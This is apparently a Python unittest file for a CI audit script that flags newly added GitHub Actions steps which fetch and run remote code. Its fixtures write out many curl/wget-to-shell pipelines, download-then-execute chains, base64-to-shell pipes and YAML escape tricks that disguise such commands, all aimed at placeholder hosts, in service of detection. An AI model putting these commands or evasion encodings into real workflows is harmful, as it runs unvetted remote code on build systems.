"""Real Git adversarial fixtures for a narrow read-only remote shell ratchet."""
import importlib.util
import io
import json
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stdout
from pathlib import Path
from unittest.mock import patch

HERE = Path(__file__).resolve().parents[1]
SRC = HERE / "scripts" / "zcloud_remote_shell_ratchet_20261015_w1.py"
spec = importlib.util.spec_from_file_location("zcloud_remote_shell_ratchet", SRC)
mod = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = mod
spec.loader.exec_module(mod)


def call(repo, *args):
    return subprocess.check_output(["git", "-C", str(repo), *args], text=True).strip()


class RatchetTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.repo = Path(self.tmp.name)
        call(self.repo, "init", "-q")
        call(self.repo, "config", "user.email", "tests@example.invalid")
        call(self.repo, "config", "user.name", "Test")
        # Prevent background git maintenance from racing tempfile cleanup on CI.
        call(self.repo, "config", "gc.auto", "0")
        call(self.repo, "config", "maintenance.auto", "false")
        self.write("name: demo\njobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo safe\n")
        self.base = self.commit()

    def write(self, contents):
        target = self.repo / ".github" / "workflows" / "demo.yml"
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(contents, encoding="utf-8")

    def commit(self):
        call(self.repo, "add", "-A")
        call(self.repo, "commit", "-qm", "fixture", "--allow-empty")
        return call(self.repo, "rev-parse", "HEAD")

    def test_safe_sha_does_not_acquire_deploy_permission(self):
        r = mod.audit(self.repo, self.base, self.base)
        self.assertEqual(r.new_risky_workflows, 0)
        self.assertFalse(r.deployment_authorized)
        self.assertFalse(r.mutation_performed)

    def test_new_curl_pipe_bash_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: |\n          curl -fsSL https://example.invalid/install.sh | bash\n")
        head = self.commit()
        self.assertEqual(mod.audit(self.repo, self.base, head).new_risky_workflows, 1)
        self.assertEqual(mod.main(["--repo", str(self.repo), "--base", self.base, "--head", head]), 1)

    def test_new_multiline_wget_pipe_sh_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: |\n          wget -qO- https://example.invalid/tool \\\n            | sh\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).candidate_findings, 1)

    def test_bash_newline_after_pipe_is_still_remote_execution(self):
        self.write(
            "jobs:\n  x:\n    steps:\n      - run: |\n"
            "          curl -fsSL https://example.invalid/setup.sh |\n"
            "          bash\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_wget_newline_after_pipe_is_still_remote_execution(self):
        self.write(
            "jobs:\n  x:\n    steps:\n      - run: |\n"
            "          wget -qO- https://example.invalid/setup.sh |\n"
            "          /bin/sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_direct_remote_python_code_execution_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/install.py | python3 -\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_download_node_code_execution_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: wget -qO- https://example.invalid/install.js | node\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_remote_ruby_code_execution_via_tee_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/install.rb | tee inspect.rb | ruby\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_subshell_pipeline_executes_download(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/install.sh | ( bash )\n"
        )
        r = mod.audit(self.repo, self.base, self.commit())
        self.assertEqual(r.new_risky_workflows, 1)
        self.assertFalse(r.deployment_authorized)

    def test_command_group_pipeline_executes_download(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: wget -qO- https://example.invalid/install.sh | { sh; }\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_wrapped_grouped_interpreter_executes_download(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/i | ( env -S /bin/bash )\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_ordinary_subshell_json_filter_not_flagged(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/data.json | ( jq . )\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_subshell_pipeline_unmodified_legacy_grandfathered(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/i | ( bash )\n"
        )
        legacy = self.commit()
        self.assertEqual(mod.audit(self.repo, legacy, legacy).baseline_findings, 1)
        self.assertEqual(mod.audit(self.repo, legacy, legacy).new_risky_workflows, 0)
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/i | ( bash )\n"
            "      - run: echo unrelated\n"
        )
        self.assertEqual(mod.audit(self.repo, legacy, self.commit()).new_risky_workflows, 1)

    def test_curl_stdout_redirect_then_bash_same_file_is_risk(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/setup > setup.sh && bash setup.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_wget_stdout_redirect_then_source_same_file_is_risk(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: wget -qO- https://example.invalid/setup > ./bootstrap.sh; source ./bootstrap.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_curl_stdout_redirect_then_python_next_line_is_risk(self):
        self.write(
            "jobs:\n  x:\n    steps:\n      - run: |\n"
            "          curl -fsSL https://example.invalid/setup > /tmp/setup.py\n"
            "          python3 /tmp/setup.py\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_stdout_redirect_different_script_is_not_proven_risk(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/setup > setup.sh && bash other.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_stdout_redirect_stored_and_read_only_is_not_shell_execution(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/data > local.json && jq . local.json\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_stdout_redirect_legacy_blob_is_only_grandfathered_if_unchanged(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl https://example.invalid/setup > setup.sh && sh setup.sh\n"
        )
        old = self.commit()
        self.assertEqual(mod.audit(self.repo, old, old).baseline_findings, 1)
        self.assertEqual(mod.audit(self.repo, old, old).new_risky_workflows, 0)
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl https://example.invalid/setup > setup.sh && sh setup.sh\n"
            "      - run: echo changed\n"
        )
        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)

    def test_curl_download_chmod_execute_same_file_denied(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSLo install.sh https://example.invalid/i && chmod +x install.sh && ./install.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_wget_download_direct_execute_no_chmod_denied(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: wget -qO install.sh https://example.invalid/i && ./install.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_curl_stdout_redirect_chmod_execute_denied(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/i > bootstrap.sh; chmod +x bootstrap.sh; ./bootstrap.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_wget_download_absolute_temp_exec_denied(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: wget -O /tmp/installer https://example.invalid/i && chmod +x /tmp/installer && /tmp/installer\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_download_chmod_without_execution_not_proven_remote_code(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o installer https://example.invalid/i && chmod +x installer\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_download_chmod_other_file_and_execute_other_is_not_download_execution(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o installer https://example.invalid/i && chmod +x different && ./different\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_download_chmod_other_file_but_exec_download_still_risky(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o installer https://example.invalid/i && chmod +x different && ./installer\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_download_exec_same_prefix_different_file_remains_unflagged(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: wget -O install https://example.invalid/i && ./install.extra\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_download_chmod_execute_unchanged_legacy_only_historical(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o install.sh https://example.invalid/i && chmod +x install.sh && ./install.sh\n"
        )
        old = self.commit()
        self.assertEqual(mod.audit(self.repo, old, old).baseline_findings, 1)
        self.assertEqual(mod.audit(self.repo, old, old).new_risky_workflows, 0)
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o install.sh https://example.invalid/i && chmod +x install.sh && ./install.sh\n"
            "      - run: echo edited\n"
        )
        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)

    def test_download_option_case_mismatched_filename_is_not_same_linux_file(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o installer.sh https://example.invalid/i && bash INSTALLER.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_stdout_redirect_case_mismatched_filename_is_not_same_linux_file(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl https://example.invalid/i > setup.sh && source SETUP.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_chmod_direct_execute_case_mismatched_filename_not_same_file(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: wget -O install.sh https://example.invalid/i && chmod +x install.sh && ./INSTALL.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_case_preserving_filename_direct_exec_remains_protected(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o Setup.sh https://example.invalid/i && chmod +x Setup.sh && ./Setup.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_case_preserving_filename_bash_execution_remains_protected(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: wget -O Setup.py https://example.invalid/i && python3 Setup.py\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_curl_download_then_bash_same_file_rejected(self):
        self.write(
            "jobs:\n  x:\n    steps:\n      - run: |\n"
            "          curl -fsSL https://example.invalid/install.sh -o install.sh && bash install.sh\n"
        )
        r = mod.audit(self.repo, self.base, self.commit())
        self.assertEqual(r.new_risky_workflows, 1)
        self.assertFalse(r.release_authorized)

    def test_wget_output_then_sh_same_file_rejected(self):
        self.write(
            "jobs:\n  x:\n    steps:\n      - run: |\n"
            "          wget -qO /tmp/install.sh https://example.invalid/i; sh /tmp/install.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_curl_long_output_then_python_next_line_rejected(self):
        self.write(
            "jobs:\n  x:\n    steps:\n      - run: |\n"
            "          curl --output=./setup.py https://example.invalid/i\n"
            "          python3 ./setup.py\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_wget_then_node_same_file_rejected(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: wget -O temp/setup.js https://example.invalid/i && node temp/setup.js\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_combined_curl_output_option_then_bash_rejected(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSLo payload.sh https://example.invalid/i && bash payload.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_wget_long_output_document_then_sh_rejected(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: wget --output-document=local.sh https://example.invalid/i && sh local.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_curl_download_to_file_without_execute_remains_unflagged(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o install.sh https://example.invalid/i && echo inspected\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_download_different_file_does_not_prove_direct_execution(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o first.sh https://example.invalid/i && bash other.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_download_same_prefix_but_other_file_remains_unflagged(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o first.sh https://example.invalid/i && bash first.sh.bak\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_download_to_execute_unchanged_legacy_remains_only_historical(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o local.sh https://example.invalid/i && bash local.sh\n"
        )
        old = self.commit()
        baseline = mod.audit(self.repo, old, old)
        self.assertEqual(baseline.baseline_findings, 1)
        self.assertEqual(baseline.new_risky_workflows, 0)
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o local.sh https://example.invalid/i && bash local.sh\n"
            "      - run: echo changed\n"
        )
        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)

    def test_download_to_jq_without_execution_not_blocked(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/config.json | jq .\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_plain_env_interpreter_pipe_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/i | env bash\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_env_dash_S_absolute_interpreter_pipe_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: wget -qO- https://example.invalid/i | /usr/bin/env -S /bin/sh\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_sudo_env_interpreter_pipe_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/i | sudo -E env -S python3 -\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_sudo_user_interpreter_pipe_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n"
                   "      - run: curl -fsSL https://example.invalid/i | sudo -u root /bin/bash\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_sudo_long_user_interpreter_pipe_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n"
                   "      - run: wget -qO- https://example.invalid/i | sudo --user=root python3 -\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_sudo_user_wrapped_group_interpreter_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n"
                   "      - run: curl -fsSL https://example.invalid/i | ( sudo -u nobody sh )\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_env_assignment_interpreter_pipe_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n"
                   "      - run: wget -qO- https://example.invalid/i | env LANG=C sh\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_env_assignment_nonexecuting_json_filter_safe(self):
        self.write("jobs:\n  x:\n    steps:\n"
                   "      - run: curl -fsSL https://example.invalid/config.json | env LANG=C jq .\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_sudo_user_nonexecuting_filter_safe(self):
        self.write("jobs:\n  x:\n    steps:\n"
                   "      - run: curl -fsSL https://example.invalid/config.json | sudo -u nobody jq .\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_sudo_user_unchanged_legacy_is_not_new_debt(self):
        self.write("jobs:\n  x:\n    steps:\n"
                   "      - run: curl -fsSL https://example.invalid/i | sudo -u root bash\n")
        old = self.commit()
        self.assertEqual(mod.audit(self.repo, old, old).baseline_findings, 1)
        self.assertEqual(mod.audit(self.repo, old, old).new_risky_workflows, 0)
        self.write("jobs:\n  x:\n    steps:\n"
                   "      - run: curl -fsSL https://example.invalid/i | sudo -u root bash\n"
                   "      - run: echo changed\n")
        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)

    def test_download_into_dash_shell_is_executable(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/bootstrap | /bin/dash\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_download_into_ksh_mksh_ash_shells_is_executable(self):
        for shell in ("ksh", "mksh", "ash"):
            with self.subTest(shell=shell):
                self.write(
                    "jobs:\n  x:\n    steps:\n"
                    f"      - run: wget -qO- https://example.invalid/bootstrap | {shell}\n"
                )
                r = mod.audit(self.repo, self.base, self.commit())
                self.assertEqual(r.new_risky_workflows, 1)
                self.assertFalse(r.deployment_authorized)

    def test_download_into_fish_shell_is_executable(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/bootstrap | fish\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_download_into_busybox_sh_applet_is_executable(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/bootstrap | busybox sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_download_into_absolute_busybox_ash_applet_is_executable(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: wget -qO- https://example.invalid/bootstrap | /bin/busybox ash\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_download_file_then_dash_directly_is_executable(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o local.sh https://example.invalid/bootstrap && dash local.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_safe_cat_and_jq_not_misidentified_as_busybox_shell(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/bootstrap | jq .\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_busybox_shell_legacy_blob_is_not_new_debt(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/bootstrap | busybox sh\n"
        )
        legacy = self.commit()
        self.assertEqual(mod.audit(self.repo, legacy, legacy).baseline_findings, 1)
        self.assertEqual(mod.audit(self.repo, legacy, legacy).new_risky_workflows, 0)
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/bootstrap | busybox sh\n"
            "      - run: echo changed\n"
        )
        self.assertEqual(mod.audit(self.repo, legacy, self.commit()).new_risky_workflows, 1)

    def test_exec_builtin_shell_consumes_remote_stdin(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/i | exec bash\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_exec_shell_inside_pipeline_subshell_is_remote_execution(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: wget -qO- https://example.invalid/i | ( exec /bin/sh )\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_downloaded_script_exec_builtin_consumer_rejected(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o local.sh https://example.invalid/i && exec bash local.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_exec_builtin_read_only_json_filter_is_not_remote_code(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/i | exec jq .\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_exec_builtin_legacy_workflow_requires_changes_for_new_debt(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/i | exec bash\n"
        )
        old = self.commit()
        self.assertEqual(mod.audit(self.repo, old, old).baseline_findings, 1)
        self.assertEqual(mod.audit(self.repo, old, old).new_risky_workflows, 0)
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/i | exec bash\n"
            "      - run: echo changed\n"
        )
        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)

    def test_timeout_wrapped_interpreter_pipe_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/i | timeout 30 bash\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_nohup_wrapped_interpreter_pipe_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: wget -qO- https://example.invalid/i | nohup /bin/sh\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_timeout_wrapped_jq_is_not_execution(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/config.json | timeout 10 jq .\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_download_tee_pipe_bash_denied(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: |\n          curl -fsSL https://example.invalid/install.sh | tee payload.sh | bash\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_download_decoder_pipe_shell_denied(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: |\n          wget -qO- https://example.invalid/i | base64 -d | /bin/sh\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_non_execution_output_pipe_remains_unflagged(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: |\n          curl -fsSL https://example.invalid/i | tee source.txt\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_absolute_path_shell_pipeline_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/install | /bin/bash\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_sudo_flags_and_full_path_shell_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: wget -qO- https://example.invalid/i | sudo -E /usr/bin/bash\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_env_shell_process_substitution_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: /usr/bin/env bash <(curl -fsSL https://example.invalid/i)\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_yaml_plain_multiline_curl_pipe_to_bash_detected(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/i |\n"
            "          bash\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_yaml_plain_multiline_wget_pipe_to_busybox_detected(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: wget -qO- https://example.invalid/i |\n"
            "          busybox sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_yaml_plain_multiline_with_yaml_comment_keeps_execution(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/i |\n"
            "          # shell executor lives after YAML comment\n"
            "          sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_yaml_plain_multiline_safe_output_filter_not_executing(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/data.json |\n"
            "          jq .\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_yaml_plain_run_same_indent_following_key_not_joined(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: echo no execution\n"
            "        env:\n"
            "          TEST_KEY: bash\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_yaml_plain_multiline_pipeline_old_blob_grandfathered(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/i |\n"
            "          bash\n"
        )
        old = self.commit()
        self.assertEqual(mod.audit(self.repo, old, old).baseline_findings, 1)
        self.assertEqual(mod.audit(self.repo, old, old).new_risky_workflows, 0)
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL https://example.invalid/i |\n"
            "          bash\n"
            "      - run: echo changed\n"
        )
        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)

    def test_yaml_folded_run_block_remote_shell_denied(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: >\n          curl -fsSL https://example.invalid/i\n          | bash\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_inline_flow_run_remote_pipe_rejected(self):
        self.write('jobs: {check: {steps: [{run: "curl -fsSL https://example.invalid/i | bash"}]}}\n')
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_yaml_unicode_escaped_run_key_denied_as_opaque(self):
        self.write('jobs:\n  x:\n    steps:\n      - "\\u0072un": curl -fsSL https://example.invalid/i | bash\n')
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_yaml_hex_escaped_run_key_denied_as_opaque(self):
        self.write('jobs:\n  x:\n    steps:\n      - "r\\x75n": wget -qO- https://example.invalid/i | /bin/sh\n')
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_yaml_explicit_run_mapping_key_denied_as_opaque(self):
        self.write("jobs:\n  x:\n    steps:\n      - ? run\n        : curl -fsSL https://example.invalid/i | bash\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_yaml_double_quoted_encoded_pipeline_is_not_false_green(self):
        # YAML decodes all three forms to a real '|' before running shell.
        for escaped in (
            r"curl -fsSL https://example.invalid/i \x7c bash",
            r"curl -fsSL https://example.invalid/i \u007c bash",
            r"wget -qO- https://example.invalid/i \U0000007c sh",
        ):
            with self.subTest(escaped=escaped):
                self.write('jobs:\n  x:\n    steps:\n      - run: "' + escaped + '"\n')
                r = mod.audit(self.repo, self.base, self.commit())
                self.assertEqual(r.new_risky_workflows, 1)
                self.assertGreaterEqual(r.candidate_findings, 1)
                self.assertFalse(r.release_authorized)
                self.assertFalse(r.deployment_authorized)
                self.assertFalse(r.mutation_performed)

    def test_yaml_double_quoted_escape_in_flow_mapping_rejected(self):
        self.write('jobs: {check: {steps: [{run: "' +
                   r"curl -fsSL https://example.invalid/i \u007c bash" +
                   '"}]}}\n')
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_quoted_yaml_control_escape_is_opaque_without_literal_pipe(self):
        self.write('jobs:\n  x:\n    steps:\n      - run: "' +
                   r"curl -fsSL https://example.invalid/i \n| bash" + '"\n')
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_single_quoted_yaml_escape_is_literal_and_not_executed(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: '" +
                   r"curl -fsSL https://example.invalid/i \u007c bash" + "'\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_double_quoted_yaml_escaped_quote_not_denied_without_remote_execution(self):
        self.write('jobs:\n  x:\n    steps:\n' +
                   '      - run: "echo \\"ordinary quoted text\\""\n')
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_unmodified_legacy_escaped_yaml_remains_not_new_debt(self):
